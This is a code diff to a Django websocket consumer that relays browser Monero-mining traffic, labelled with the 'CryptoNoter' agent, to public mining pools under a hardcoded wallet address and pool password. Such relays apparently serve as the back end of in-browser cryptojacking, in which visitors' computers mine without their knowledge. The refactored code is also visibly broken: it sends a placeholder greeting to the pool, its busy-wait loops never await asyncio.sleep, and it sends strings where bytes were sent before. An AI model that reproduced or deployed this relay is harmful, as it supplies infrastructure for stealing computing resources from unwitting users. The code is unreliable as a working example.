@@ -5,9 +5,9 @@ from asgiref.sync import sync_to_async
 #'pool.hashvault.pro:80', #
 
 conf = {
-    'pool': 'pool.supportxmr.com:3333',
+    'pool': 'gulf.moneroocean.stream:10032', #'pool.supportxmr.com:3333',
     'addr': '479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw',
-    'pass': ''
+    'pass': 'lotteh'
 }
 
 async def connect_pool(self):
@@ -17,23 +17,9 @@ async def connect_pool(self):
     addr = socket.gethostbyname(pool[0])
     ws_url = 'ws://{}:{}'.format(pool[0],pool[1])
     from django.conf import settings
-    tmp = ws_url.split('//')[1]
-    hostname, port = tmp.split(':')
-    port = int(port)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((hostname, port))
-    conn = {
-        'uid': None,
-        'pid': os.urandom(12).hex(),
-        'workerId': None,
-        'found': 0,
-        'accepted': 0,
-        'ws': self,
-        'pl': sock
-    }
-    self.conn = conn
-    params = {"login": conf['addr'], "pass": conf['pass'], "agent": 'CryptoNoter'}
-    sock.send((json.dumps({'method':'login', 'params': params}) + '\n').encode())
+    import asyncio
+    import websockets
+
     async def on_message(conn, ws, data):
         try:
             conn = self.conn
@@ -51,14 +37,27 @@ async def connect_pool(self):
             import traceback
             print(traceback.format_exc())
 
-    async def receive(self, conn, sock):
-        while self.connected:
-            asyncio.sleep(1)
-            data = await sock.recv(99999)
-            print(data)
-            await on_message(conn, sock, data)
 
-    self.rec_task = asyncio.create_task(receive(self, conn, sock))
+
+
+    async def receive(self):
+        async with websockets.connect(ws_url) as websocket:  # Replace with your WebSocket URL
+            conn = {
+                'uid': None,
+                'pid': os.urandom(12).hex(),
+                'workerId': None,
+                'found': 0,
+                'accepted': 0,
+                'ws': self,
+                'pl': websocket
+            }
+            self.conn = conn
+            await websocket.send("Hello, server!")
+            while self.connected:
+                message = await websocket.recv()
+                await on_message(conn, websocket, message)
+
+    self.rec_task = asyncio.create_task(receive(self))
 
 async def ws2pool(conn, data):
     buf = None;
@@ -79,7 +78,7 @@ async def ws2pool(conn, data):
                 "id": conn['pid']
             }
             buf = json.dumps(buf) + '\n'
-            conn['pl'].send(buf.encode())
+            conn['pl'].send(buf) #.encode())
         case 'submit':
             conn['found']+=1
             buf = {
@@ -93,7 +92,7 @@ async def ws2pool(conn, data):
                 "id": conn['pid']
             }
             buf = json.dumps(buf) + '\n'
-            conn['pl'].send(buf.encode())
+            conn['pl'].send(buf) #.encode())
 
 async def pool2ws(conn, data):
     try:
@@ -159,8 +158,17 @@ async def pool2ws(conn, data):
 class MiningProxyConsumer(AsyncWebsocketConsumer):
     conn = None
     ws = None
+    socket_connected = False
+    socket_connecting = False
     async def connect(self):
         self.connected = True
+        if not self.socket_connecting:
+            self.socket_connecting = True
+            await connect_pool(self)
+            self.socket_connected = True
+        elif not self.socket_connected:
+            while not self.socket_connected:
+                asyncio.sleep(1)
         await self.accept()
 
     async def disconnect(self, close_code):
@@ -171,7 +179,8 @@ class MiningProxyConsumer(AsyncWebsocketConsumer):
         self.connected = False
 
     async def receive(self, text_data):
-        if not self.conn: await connect_pool(self)
-        await ws2pool(self.conn, text_data)
+        while not self.conn:
+            await asyncio.sleep(1)
         print('[>] Request: ' + self.conn['uid'] + '\n\n' + text_data + '\n')
+        await ws2pool(self.conn, text_data)
 
